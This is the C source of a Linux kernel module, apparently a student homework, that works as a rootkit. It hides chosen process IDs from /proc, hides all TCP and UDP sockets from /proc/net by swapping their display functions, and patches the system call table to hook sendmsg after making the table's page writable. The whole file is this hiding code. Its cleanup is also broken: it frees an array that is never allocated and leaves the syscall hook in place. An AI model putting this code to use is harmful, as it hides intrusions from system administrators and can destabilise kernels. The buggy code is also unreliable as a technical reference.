#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/proc_fs.h>
#include <linux/file.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/net_namespace.h>
#include <linux/socket.h>
#include <linux/types.h>
#include <asm/unistd.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);
typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
// type for sys_sendmsg
typedef asmlinkage long (*fun_long_int_struct_msghdr_unsigned)(int, struct msghdr __user*, unsigned);
fun_long_int_struct_msghdr_unsigned orig_sendmsg;
int nr_sys_sendmsg;

fun_ssize_t_int_pvoid_size_t     original_read;
int_filep_voidp_filldir_t proc_original_readdir;
filldir_t original_proc_fillfir;
struct proc_dir_entry *proc;
fun_int_seq_file_void tcp_show_orig;
fun_int_seq_file_void udp_show_orig;

//
static int pids_to_hide[256];
static int pids_count = 0;
module_param_array(pids_to_hide, int, &pids_count, 0000);
MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");


// we convert all pids to strings in load_module for easier comparison later on
char **char_pids_to_hide;

int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    int i;
    for(i = 0; i<pids_count; i++)
    {
        if(strcmp(char_pids_to_hide[i], name)==0){
            OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
            return 0;
        }
    }

    return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_readdir(struct file *filep, void *dirent, filldir_t filldir)
{
    original_proc_fillfir = filldir;
    return proc_original_readdir(filep, dirent, hooked_proc_filldir);
}

static int hooked_udp_show(struct seq_file* file, void* v){
    return 0;
}

static int hooked_tcp_show(struct seq_file* file, void* v){
    return 0;
}

asmlinkage long hooked_sendmsg(int fd, struct msghdr __user* msg, unsigned flags){
    OUR_DEBUG("Hooked sendmsg\n");
    return orig_sendmsg(fd, msg, flags);
}

int find_syscall(void* addr){
    void** syscall_table = ptr_sys_call_table;
    void** ptr_to_sys_call;
    int i;
    i = 0;
    ptr_to_sys_call = ptr_sys_call_table;
    while((void*)addr - *(void**)ptr_to_sys_call){
        i++;
        ptr_to_sys_call++;
    }
    return i;

}

void hide_sockets(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table = ptr_sys_call_table;
    void** pointer_to_sys_sendmsg;
    int i;
    while (p){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_show_orig = tcp_seq->seq_ops.show;
            tcp_seq->seq_ops.show = hooked_tcp_show;
        }
        p = p->next;
    }
    p = (struct proc_dir_entry*) init_net.proc_net->subdir;
    udp_seq = 0;
    while (p){
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_show_orig = udp_seq->seq_ops.show;
            udp_seq->seq_ops.show = hooked_udp_show;
            break;
        }
        p = p->next;
    }
    i = 0;
    pointer_to_sys_sendmsg = syscall_table;
    OUR_DEBUG("Test: %d, %d\n", __NR_write, find_syscall(ptr_sys_sendmsg));
    while ((void*)ptr_sys_sendmsg - *(void**)pointer_to_sys_sendmsg){
        i++;
        pointer_to_sys_sendmsg++;
    }
    nr_sys_sendmsg = i;
    OUR_DEBUG("Index: %d\n", i);
    OUR_DEBUG("Found an address: %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
    orig_sendmsg = (fun_long_int_struct_msghdr_unsigned)*pointer_to_sys_sendmsg;
    make_page_writable((long unsigned int)pointer_to_sys_sendmsg);
    syscall_table[i] = hooked_sendmsg;
    OUR_DEBUG("New contents:     %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
}

void unhide_sockets(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table;
    while (p && strcmp(p->name, "tcp")!=0){
        p = p->next;
    }
    if (p && tcp_show_orig){
        tcp_seq = p->data;
        tcp_seq->seq_ops.show = tcp_show_orig;
    }
    p = init_net.proc_net->subdir;
    while (p && strcmp(p->name, "udp")!=0){
        p = p->next;
    }
    if (p && udp_show_orig){
        udp_seq = p->data;
        udp_seq->seq_ops.show = udp_show_orig;
    }
    syscall_table = (void**) ptr_sys_call_table;
    // syscall_table[nr_sys_sendmsg] = orig_sendmsg;
}

// helper function to compute log10 of some int, needed for knowing how much mem to allocate
int log10(int i)
{
    int result = 0;
    while(i>0){
        result++;
        i /= 10;
    }
    return result;
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6, homework 6.\n");
    hide_sockets();

    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    int i;
    for(i = 0; i<pids_count; i++){
        kfree(char_pids_to_hide[i]);
    }
    kfree(char_pids_to_hide);
    unhide_sockets();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
